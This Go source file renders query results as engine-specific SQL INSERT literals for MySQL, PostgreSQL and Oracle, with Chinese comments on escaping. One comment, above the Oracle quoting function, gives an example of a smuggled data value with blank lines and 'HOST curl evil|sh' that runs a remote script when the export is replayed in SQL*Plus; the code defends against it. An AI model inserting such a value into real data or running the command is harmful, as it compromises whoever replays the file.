package gateway

// 导出成 SQL 文件:把结果集写成目标库能直接执行的 INSERT。
//
// CSV 只要把值原样写出去;SQL 不行 —— 值要写成**字面量**,而字面量的规则每个库不同:
//
//   - NULL 必须写 NULL。写成 '' 会把空值变成空串,导回去就不是原来的数据。这也是导出
//     不能再走"每格一个字符串"那条路的原因(见 Cell)。
//   - MySQL 默认把反斜杠当转义符:'C:\new' 读回来是 C:<换行>ew,所以反斜杠要写成 \\。
//     PostgreSQL(standard_conforming_strings 默认开)恰好相反,反斜杠是普通字符;含反斜杠
//     时改用 E'' 形式,两种设置下都读回原值。Oracle 只认 '' 一种转义。
//   - 数字不加引号;时间在 Oracle 上写 TIMESTAMP '…'(按 NLS 格式隐式转换的字符串在
//     另一台库上可能读不回来);二进制写十六进制。
//
// 一条 INSERT 带多行能让文件小、导入快,但 Oracle 不支持 VALUES (…),(…),每行一条。

import (
	"encoding/hex"
	"regexp"
	"strings"
)

// CellKind 是一格值在 SQL 里该怎么写:决定它加不加引号、用哪种字面量。
type CellKind int

const (
	KindText CellKind = iota
	KindNumber
	KindTime
	KindBinary
	KindBool
)

// Cell 是导出成 SQL 时的一格值:文本形式 + 是否为 NULL + 它是哪一类值。
// 只有字符串不够 —— NULL 与 '' 在字符串里是同一个东西。
type Cell struct {
	Text string
	Null bool
	Kind CellKind
}

// sqlInsertBatch 是一条 INSERT 带的行数(支持多行 VALUES 的库)。
const sqlInsertBatch = 100

// SQLInsertBatch reports how many rows one INSERT carries on this engine: 1 on
// Oracle (no multi-row VALUES), sqlInsertBatch elsewhere.
func SQLInsertBatch(engine string) int {
	if engineFamily(engine) == familyOracle {
		return 1
	}
	return sqlInsertBatch
}

var numberLiteralRe = regexp.MustCompile(`^-?(\d+\.?\d*|\.\d+)([eE][-+]?\d+)?$`)

// SQLLiteral renders one cell as a literal of the target engine.
func SQLLiteral(engine string, c Cell) string {
	if c.Null {
		return "NULL"
	}
	fam := engineFamily(engine)
	switch c.Kind {
	case KindNumber:
		// 打码后的数字列(******)不再是数字:照文本写,不能写成一个非法的裸词。
		if numberLiteralRe.MatchString(c.Text) {
			return c.Text
		}
	case KindBool:
		switch strings.ToLower(c.Text) {
		case "true", "t", "1":
			return "TRUE"
		case "false", "f", "0":
			return "FALSE"
		}
	case KindTime:
		if fam == familyOracle {
			return "TIMESTAMP " + quoteString(fam, c.Text)
		}
	case KindBinary:
		h := hex.EncodeToString([]byte(c.Text))
		switch fam {
		case familyPostgres:
			return `'\x` + h + `'::bytea`
		case familyOracle:
			return "HEXTORAW('" + h + "')"
		default:
			return "X'" + h + "'"
		}
	}
	return quoteString(fam, c.Text)
}

func quoteString(fam, s string) string {
	switch fam {
	case familyMySQL:
		s = strings.ReplaceAll(s, `\`, `\\`)
		return "'" + strings.ReplaceAll(s, "'", "''") + "'"
	case familyPostgres:
		if strings.Contains(s, `\`) {
			s = strings.ReplaceAll(s, `\`, `\\`)
			return "E'" + strings.ReplaceAll(s, "'", "''") + "'"
		}
	case familyOracle:
		return quoteOracleString(s)
	}
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

// quoteOracleString 把换行写成 CHR(10) / CHR(13),字面量里不留真换行。
//
// 这些文件常用 SQL*Plus 回放,而它是按行读的:字符串里的空行(SQLBLANKLINES 默认关)、只有 . 或 /
// 的行都会结束语句缓冲,下一行就被当成命令 —— 一条数据写着 '<换行><换行>HOST curl evil|sh',回放
// 导出文件的人就执行了它(2026-11 审计 V-14)。SET SQLBLANKLINES ON 只挡得住空行,所以不靠它。
func quoteOracleString(s string) string {
	if !strings.ContainsAny(s, "\r\n") {
		return "'" + strings.ReplaceAll(s, "'", "''") + "'"
	}
	var parts []string
	start := 0
	flush := func(end int) {
		if end > start {
			parts = append(parts, "'"+strings.ReplaceAll(s[start:end], "'", "''")+"'")
		}
	}
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '\n':
			flush(i)
			parts = append(parts, "CHR(10)")
			start = i + 1
		case '\r':
			flush(i)
			parts = append(parts, "CHR(13)")
			start = i + 1
		}
	}
	flush(len(s))
	return strings.Join(parts, "||")
}

// QuoteIdent quotes a (possibly schema-qualified) identifier for the engine:
// backticks on MySQL, double quotes elsewhere, each part on its own.
func QuoteIdent(engine, name string) string {
	parts := strings.Split(name, ".")
	for i, p := range parts {
		parts[i] = quoteIdentPart(engineFamily(engine), strings.Trim(p, "`\""))
	}
	return strings.Join(parts, ".")
}

// QuoteTableName quotes a table name the user typed (or that was read off the
// query text), folding it first the way the engine folds an UNQUOTED name:
// upper case on Oracle, lower case on PostgreSQL. Quoted as typed, `t_member` on
// Oracle would name a table "t_member" that does not exist — the real one is
// T_MEMBER. Column names are not folded: they come from the result's metadata
// and are already the real names.
func QuoteTableName(engine, name string) string {
	switch engineFamily(engine) {
	case familyOracle:
		name = strings.ToUpper(name)
	case familyPostgres:
		name = strings.ToLower(name)
	}
	return QuoteIdent(engine, name)
}

func quoteIdentPart(fam, p string) string {
	if fam == familyMySQL {
		return "`" + strings.ReplaceAll(p, "`", "``") + "`"
	}
	return `"` + strings.ReplaceAll(p, `"`, `""`) + `"`
}

// InsertStatements renders rows as INSERT statements into table: one statement
// carrying every row where the engine supports multi-row VALUES, one per row on
// Oracle. The caller sizes rows to SQLInsertBatch.
func InsertStatements(engine, table string, cols []string, rows [][]Cell) string {
	if len(rows) == 0 {
		return ""
	}
	qcols := make([]string, len(cols))
	for i, c := range cols {
		qcols[i] = QuoteIdent(engine, c)
	}
	head := "INSERT INTO " + QuoteTableName(engine, table) + " (" + strings.Join(qcols, ", ") + ") VALUES"
	tuple := func(r []Cell) string {
		vals := make([]string, len(r))
		for i, c := range r {
			vals[i] = SQLLiteral(engine, c)
		}
		return "(" + strings.Join(vals, ", ") + ")"
	}
	var b strings.Builder
	if SQLInsertBatch(engine) == 1 {
		for _, r := range rows {
			b.WriteString(head + " " + tuple(r) + ";\n")
		}
		return b.String()
	}
	b.WriteString(head + "\n")
	for i, r := range rows {
		b.WriteString(tuple(r))
		if i < len(rows)-1 {
			b.WriteString(",\n")
		}
	}
	b.WriteString(";\n")
	return b.String()
}
